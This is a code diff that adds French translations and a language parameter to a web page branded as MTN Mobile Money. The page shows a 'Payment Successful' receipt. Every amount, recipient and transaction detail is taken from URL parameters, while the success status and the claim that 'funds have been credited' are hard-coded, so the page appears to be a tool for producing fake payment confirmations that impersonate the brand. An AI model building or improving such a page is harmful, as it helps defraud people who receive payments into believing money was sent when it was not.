@@ -35,7 +35,6 @@
     position: relative; overflow: hidden;
   }
 
-  /* ===== Toolbar ===== */
   .toolbar {
     flex-shrink: 0; background: var(--mtn-white);
     padding: max(12px, env(safe-area-inset-top, 0px)) 16px 10px;
@@ -54,7 +53,6 @@
   .tool-primary { background: var(--mtn-royal); color: #fff; border-color: var(--mtn-royal); }
   .tool-primary:hover { filter: brightness(1.08); }
 
-  /* ===== Header ===== */
   .top {
     position: relative; flex-shrink: 0;
     background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
@@ -81,14 +79,12 @@
     line-height: 1.5; max-width: 320px;
   }
 
-  /* ===== Body ===== */
   .body {
     flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
     padding: 24px 22px 24px;
     display: flex; flex-direction: column;
   }
 
-  /* ===== Success tick ===== */
   .status-block {
     text-align: center; margin-bottom: 22px;
   }
@@ -124,7 +120,6 @@
     max-width: 320px; margin: 0 auto;
   }
 
-  /* ===== Amount hero ===== */
   .amount-block {
     display: flex; align-items: baseline; justify-content: center; gap: 8px;
     margin: 4px 0 18px;
@@ -135,7 +130,6 @@
     color: var(--mtn-deep); line-height: 1;
   }
 
-  /* ===== Recipient line ===== */
   .recipient-line {
     text-align: center;
     font-size: 13px; color: var(--mtn-gray); line-height: 1.5;
@@ -146,7 +140,6 @@
     font-size: 14.5px; margin-top: 2px; word-break: break-word;
   }
 
-  /* ===== Details panel ===== */
   .details-panel {
     width: 100%;
     background: var(--mtn-soft); border-radius: 12px;
@@ -173,7 +166,6 @@
   }
   .detail-row .v.success { color: var(--mtn-green-dark); font-weight: 800; }
 
-  /* ===== Footer brand ===== */
   .mtn-footer {
     width: 100%; margin-top: 4px;
     background: var(--mtn-yellow);
@@ -194,7 +186,6 @@
   }
   .mtn-footer .foot-support strong { font-weight: 800; }
 
-  /* ===== Close button ===== */
   .close-btn {
     width: 100%; margin-top: 16px; height: 52px;
     background: var(--mtn-royal); color: #fff;
@@ -208,7 +199,6 @@
   .close-btn:hover { filter: brightness(1.08); }
   .close-btn:active { transform: scale(0.99); }
 
-  /* ===== Toast ===== */
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
@@ -218,7 +208,6 @@
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  /* ===== Responsive ===== */
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
     .body { padding: 20px 18px 18px; }
@@ -262,7 +251,7 @@
       <span>📋</span> <span id="copyLbl">Copy Receipt</span>
     </button>
     <button class="tool-btn tool-primary" onclick="window.print()">
-      <span>🖨</span> Print
+      <span>🖨</span> <span id="printLbl">Print</span>
     </button>
   </div>
 
@@ -270,8 +259,8 @@
     <div class="top-row">
       <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
     </div>
-    <div class="page-title">Payment Successful</div>
-    <div class="page-sub">Your transaction has been approved and the funds have been credited.</div>
+    <div class="page-title" id="pageTitle">Payment Successful</div>
+    <div class="page-sub" id="pageSub">Your transaction has been approved and the funds have been credited.</div>
   </div>
 
   <div class="body">
@@ -290,7 +279,7 @@
     </div>
 
     <div class="recipient-line">
-      To
+      <span id="recipientLabel">To</span>
       <span class="recv-name" id="reqRecipient">—</span>
     </div>
 
@@ -299,12 +288,12 @@
     <div class="mtn-footer">
       <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
       <div class="foot-support">
-        Need help?<br>
-        Call <strong id="supportNum">—</strong>
+        <span id="needHelpLabel">Need help?</span><br>
+        <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
       </div>
     </div>
 
-    <button class="close-btn" onclick="closePage()">Close</button>
+    <button class="close-btn" onclick="closePage()" id="closeBtn">Close</button>
 
   </div>
 </div>
@@ -312,9 +301,99 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ============================================================
-     Support numbers + currency locales
-  ============================================================ */
+  /* ═══════════════════════════════════════════════════════════
+     TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  const I18N = {
+    en: {
+      docTitle: 'Payment Successful · MTN Mobile Money',
+      copyReceipt: 'Copy Receipt',
+      print: 'Print',
+      copied: 'Copied ✓',
+      copyToast: 'Receipt copied to clipboard.',
+      pageTitle: 'Payment Successful',
+      pageSub: 'Your transaction has been approved and the funds have been credited.',
+      statusTitle: 'Credited Successfully',
+      statusDesc: 'Your payment has been approved. A confirmation SMS has been sent to your phone.',
+      toLabel: 'To',
+      needHelp: 'Need help?',
+      callLabel: 'Call',
+      close: 'Close',
+      kCountry: 'Country',
+      kTransactionId: 'Transaction ID',
+      kTransactionDate: 'Transaction date',
+      kPaymentMethod: 'Payment method',
+      kService: 'Service',
+      kMarketed: 'Marketed',
+      kStatus: 'Status',
+      vCompleted: 'Payment Completed Successfully',
+      receiptTitle: 'MTN Mobile Money — Payment Successful',
+      receiptStatus: 'Status',
+      receiptAmount: 'Amount',
+      receiptRecipient: 'Recipient',
+      receiptCountry: 'Country',
+      receiptTxId: 'Transaction ID',
+      receiptPaymentMethod: 'Payment method',
+      receiptService: 'Service',
+      receiptMarketed: 'Marketed',
+      receiptDate: 'Date'
+    },
+    fr: {
+      docTitle: 'Paiement réussi · MTN Mobile Money',
+      copyReceipt: 'Copier le reçu',
+      print: 'Imprimer',
+      copied: 'Copié ✓',
+      copyToast: 'Reçu copié dans le presse-papiers.',
+      pageTitle: 'Paiement réussi',
+      pageSub: 'Votre transaction a été approuvée et les fonds ont été crédités.',
+      statusTitle: 'Crédité avec succès',
+      statusDesc: 'Votre paiement a été approuvé. Un SMS de confirmation a été envoyé sur votre téléphone.',
+      toLabel: 'À',
+      needHelp: 'Besoin d\'aide ?',
+      callLabel: 'Appelez le',
+      close: 'Fermer',
+      kCountry: 'Pays',
+      kTransactionId: 'ID de transaction',
+      kTransactionDate: 'Date de la transaction',
+      kPaymentMethod: 'Mode de paiement',
+      kService: 'Service',
+      kMarketed: 'Commercialisé par',
+      kStatus: 'Statut',
+      vCompleted: 'Paiement effectué avec succès',
+      receiptTitle: 'MTN Mobile Money — Paiement réussi',
+      receiptStatus: 'Statut',
+      receiptAmount: 'Montant',
+      receiptRecipient: 'Destinataire',
+      receiptCountry: 'Pays',
+      receiptTxId: 'ID de transaction',
+      receiptPaymentMethod: 'Mode de paiement',
+      receiptService: 'Service',
+      receiptMarketed: 'Commercialisé par',
+      receiptDate: 'Date'
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  const currentLang = I18N[urlLang] ? urlLang : 'en';
+  const T = I18N[currentLang];
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || ''
+  };
+
+  /* ═══════════════════════════════════════════════════════════
+     SUPPORT NUMBERS + CURRENCY LOCALES
+  ═══════════════════════════════════════════════════════════ */
   const SUPPORT_NUMBERS = {
     'Cameroon': '8787',
     'Zambia': '111',
@@ -352,7 +431,8 @@
 
   function formatDate(ts) {
     const d = ts ? new Date(ts) : new Date();
-    return d.toLocaleString(undefined, {
+    const locale = currentLang === 'fr' ? 'fr-FR' : undefined;
+    return d.toLocaleString(locale, {
       day: '2-digit', month: 'short', year: 'numeric',
       hour: '2-digit', minute: '2-digit'
     });
@@ -365,27 +445,29 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2200);
   }
 
-  /* ============================================================
-     Read transaction from URL
-  ============================================================ */
-  const params = new URLSearchParams(location.search);
-  const tx = {
-    ref: params.get('tx') || '',
-    am:  params.get('am') || '',
-    cur: params.get('cur') || '',
-    rn:  params.get('rn') || '',
-    c:   params.get('c') || '',
-    pm:  params.get('pm') || '',
-    sn:  params.get('sn') || '',
-    mk:  params.get('mk') || '',
-    an:  params.get('an') || '',
-    dt:  params.get('dt') || ''
-  };
+  /* ═══════════════════════════════════════════════════════════
+     APPLY TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('copyLbl').textContent = T.copyReceipt;
+    document.getElementById('printLbl').textContent = T.print;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('statusTitle').textContent = T.statusTitle;
+    document.getElementById('statusDesc').textContent = T.statusDesc;
+    document.getElementById('recipientLabel').textContent = T.toLabel;
+    document.getElementById('needHelpLabel').textContent = T.needHelp;
+    document.getElementById('callLabel').textContent = T.callLabel;
+    document.getElementById('closeBtn').textContent = T.close;
+  }
 
-  /* ============================================================
-     Render
-  ============================================================ */
+  /* ═══════════════════════════════════════════════════════════
+     RENDER
+  ═══════════════════════════════════════════════════════════ */
   function render() {
+    applyTranslations();
+
     /* Amount */
     document.getElementById('amtCur').textContent = (tx.cur || '').toUpperCase();
     document.getElementById('amtVal').textContent =
@@ -400,13 +482,13 @@
 
     /* Detail rows */
     const rows = [
-      { k: 'Country',          v: tx.c },
-      { k: 'Transaction ID',   v: tx.ref, mono: true },
-      { k: 'Transaction date', v: tx.dt ? formatDate(tx.dt) : formatDate() },
-      { k: 'Payment method',   v: tx.pm },
-      { k: 'Service',          v: tx.sn },
-      { k: 'Marketed',         v: tx.mk },
-      { k: 'Status',           v: 'Payment Completed Successfully', cls: 'success' }
+      { k: T.kCountry,         v: tx.c },
+      { k: T.kTransactionId,   v: tx.ref, mono: true },
+      { k: T.kTransactionDate, v: tx.dt ? formatDate(tx.dt) : formatDate() },
+      { k: T.kPaymentMethod,   v: tx.pm },
+      { k: T.kService,         v: tx.sn },
+      { k: T.kMarketed,        v: tx.mk },
+      { k: T.kStatus,          v: T.vCompleted, cls: 'success' }
     ];
 
     let html = '';
@@ -416,9 +498,6 @@
       html += `<div class="detail-row"><span class="k">${escapeHtml(r.k)}</span><span class="v ${vcls}">${escapeHtml(r.v)}</span></div>`;
     });
     document.getElementById('detailsPanel').innerHTML = html;
-
-    /* Title */
-    document.title = 'Payment Successful · MTN Mobile Money';
   }
 
   function escapeHtml(s) {
@@ -427,31 +506,31 @@
     }[c]));
   }
 
-  /* ============================================================
-     Copy receipt
-  ============================================================ */
+  /* ═══════════════════════════════════════════════════════════
+     COPY RECEIPT
+  ═══════════════════════════════════════════════════════════ */
   function copyReceipt() {
     const lines = [
-      'MTN Mobile Money — Payment Successful',
+      T.receiptTitle,
       '=====================================',
-      'Status: Payment Completed Successfully',
-      'Amount: ' + (tx.am ? formatAmount(tx.am, tx.cur) : '—'),
-      'Recipient: ' + (tx.rn || ''),
-      'Country: '   + (tx.c || ''),
-      'Transaction ID: ' + (tx.ref || ''),
-      'Payment method: ' + (tx.pm || ''),
-      'Service: ' + (tx.sn || ''),
-      'Marketed: ' + (tx.mk || ''),
-      'Date: ' + formatDate(tx.dt)
+      T.receiptStatus + ': ' + T.vCompleted,
+      T.receiptAmount + ': ' + (tx.am ? formatAmount(tx.am, tx.cur) : '—'),
+      T.receiptRecipient + ': ' + (tx.rn || ''),
+      T.receiptCountry + ': '   + (tx.c || ''),
+      T.receiptTxId + ': ' + (tx.ref || ''),
+      T.receiptPaymentMethod + ': ' + (tx.pm || ''),
+      T.receiptService + ': ' + (tx.sn || ''),
+      T.receiptMarketed + ': ' + (tx.mk || ''),
+      T.receiptDate + ': ' + formatDate(tx.dt)
     ].join('\n');
 
     const btn = document.getElementById('copyBtn');
     const lbl = document.getElementById('copyLbl');
     const done = () => {
       btn.classList.add('copied');
-      lbl.textContent = 'Copied ✓';
-      showToast('Receipt copied to clipboard.');
-      setTimeout(() => { btn.classList.remove('copied'); lbl.textContent = 'Copy Receipt'; }, 1800);
+      lbl.textContent = T.copied;
+      showToast(T.copyToast);
+      setTimeout(() => { btn.classList.remove('copied'); lbl.textContent = T.copyReceipt; }, 1800);
     };
     if (navigator.clipboard && navigator.clipboard.writeText) {
       navigator.clipboard.writeText(lines).then(done).catch(() => { fallbackCopy(lines); done(); });
@@ -465,14 +544,14 @@
     document.body.removeChild(ta);
   }
 
-  /* ============================================================
-     Close → return to payment link
-  ============================================================ */
+  /* ═══════════════════════════════════════════════════════════
+     CLOSE → return to payment link
+  ═══════════════════════════════════════════════════════════ */
   function closePage() {
     if (tx.ref) {
       try {
         const base = new URL('index.html', window.location.href);
-        base.search = '?r=' + encodeURIComponent(tx.ref);
+        base.search = '?r=' + encodeURIComponent(tx.ref) + '&lang=' + encodeURIComponent(currentLang);
         base.hash = '';
         window.location.href = base.toString();
         return;
@@ -485,7 +564,6 @@
     }
   }
 
-  /* Escape = close */
   document.addEventListener('keydown', (e) => {
     if (e.key === 'Escape') closePage();
   });
